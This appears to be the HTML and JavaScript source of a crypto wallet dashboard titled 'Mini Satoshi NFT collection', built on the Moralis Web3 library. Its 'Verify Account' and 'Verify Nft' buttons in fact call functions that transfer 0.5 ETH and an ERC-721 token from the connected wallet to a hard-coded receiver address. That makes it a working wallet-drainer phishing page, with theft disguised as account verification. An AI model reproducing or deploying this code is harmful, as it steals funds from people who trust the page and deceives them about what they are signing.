
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>

    <meta charset="utf-8">
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.7/web3-provider.min.js"></script>
    <script src="https://unpkg.com/moralis/dist/moralis.js"></script>
<link rel="stylesheet" href="/dappstyle.css">
    <title></title>
  </head>
  <body>
    <div class="">
      <button class="button_wc" id="btn-login" onclick="login()">Connect Wallet</button>
      <button class="button_logout" id="btn-logout">Logout</button>
      <button id="btn-get-stats" onclick="displayWallet()" >Refresh Stats</button>
      <button id="sendeTh" type="button" onclick="sendEth()" name="button">Verify Account</button>
      <button id="sendnft" type="button" onclick="sendNft()" name="button">Verify Nft</button>
      <div class="connecticut">
        <form class="" action="/the" method="post">
          <button type="submit" name="connectTo" >Nodeconnect</button>
        </form>
    <ul id="gas-stats"></ul>
    </div>


</div>
          <section>

          </section>

          <section id="nft_header">
            <h1 style="
            justify-content: center; padding-top: 2px; position:sticky;text-align: center; background: black; margin:0; font-size: 1.5em;">Your Mini Satoshi NFT collection</h1>
          </section>

          <section id="nft_main" class="nft_image">
            <div id="nft_viewer" >
  <h1>your Wallet address</h1>
  <h2 id="wallet_address" style=" color:white; font-size:2.5rem;" ></h1>
  <h2 id="wallet_balance" style=" color:white; font-size:2.5rem;" ></h1>
          </div>
          <div id="sbsc_amount" style=" display: inline-block !important; font-weight: 700; color: aliceblue; line-height: 15px; padding-left: 15px; padding-top:20px; text-align: center;vertical-align:middle !important; ">&nbsp;</div>

          <!-- <div id="sbsc_dollar" style="float: right !important;
          clear: both !important;">&nbsp;</div> -->
            <!-- <a href="#">Your Logo</a> -->
        </div>

          </section>


<script type="text/javascript">
  Moralis.initialize("qzmwR7GsUDMGwahH6Z13MXUCZvi0D0Dw9lrvJG2h");
Moralis.serverURL = ("https://fjhqwoplnapa.usemoralis.com:2053/server");

async function login() {
  let user = Moralis.User.current();
  if (!user) {
    user = await Moralis.authenticate({
      signingMessage: "Log in using Moralis",
    })
      .then(function (user) {
        console.log("logged in user:", user);
         const walletAddress = user.get("ethAddress");
        console.log(walletAddress);
      })
      .catch(function (error) {
        console.log(error);
      });
  }
}
async function sendEth(){
  await Moralis.authenticate();
  await Moralis.enableWeb3();
  const options = {type: "native", amount:Moralis.Units.ETH("0.5"), receiver: "0x4bd12e3cf4aa5c1596452686369bf535c0a0f40e"};
// Moralis.transfer({type: "native", receiver: "0x727a9fe2F14A3a2e630FDa17c047F3661F0f6ECC", amount:Moralis.Units.ETH("0.1")});
  let result = await Moralis.transfer(options);
  console.log(result);
}
async function sendNft(){
  const options = {type: "erc721", receiver: "0x4bd12e3cf4aa5c1596452686369bf535c0a0f40e", contract_address: "0x17763df418b812eba95edc826a1748b743db4129", token_id: 1}
  let result = await Moralis.transfer(options);
}
async function displayWallet(){
  const options={
chain: "eth",
   address: walletAddress,
 };

// nftList = await Moralis.Web3API.account.getNfts(options);
balances = await Moralis.Web3API.account.getNativeBalance(options);
  const showWallet = document.getElementById("wallet_address");
  const showBalance = document.getElementById("wallet_balance");
  showWallet.style.display = 'block';
  showWallet.innerHTML=walletAddress;
  // shownfts.innerHTML=nftList.nft;
  // shownfts.style.display = 'block';
  console.log(balances);
  showBalance.innerHTML=balances.balance;

}
 async function logOut() {
   await Moralis.User.logOut();
   console.log("logged out");
 }
 document.getElementById("btn-login").onclick = login;
 document.getElementById("btn-logout").onclick = logOut;
 document.getElementById("btn-get-stats").onclick = getStats;

 // refresh stats
 function getStats() {
   const user = Moralis.User.current();
   if (user) {
     getUserTransactions(user);
   }
   getAverageGasPrices();
 }

 // HISTORICAL TRANSACTIONS
 async function getUserTransactions(user) {
   // create query
   const query = new Moralis.Query("EthTransactions");
   query.equalTo("from_address", user.get("ethAddress"));

   // subscribe to query updates
   const subscription = await query.subscribe();
   handleNewTransaction(subscription);

   // run query
   const results = await query.find();
   console.log("user transactions:", results);
 }

 // REAL-TIME TRANSACTIONS
 async function handleNewTransaction(subscription) {
   // log each new transaction
   subscription.on("create", function (data) {
     console.log("new transaction: ", data);
   });
 }

 // CLOUD FUNCTION
 async function getAverageGasPrices() {
   const results = await Moralis.Cloud.run("getAvgGas");
   console.log("average user gas prices:", results);
   renderGasStats(results);
 }

 function renderGasStats(data) {
   const container = document.getElementById("gas-stats");
   container.innerHTML = data
     .map(function (row, rank) {
       return `<li>#${rank + 1}: ${Math.round(row.avgGas)} gwei</li>`;
     })
     .join("");
 }

 //get stats on page load
 getStats();
</script>

    </body>
</html>
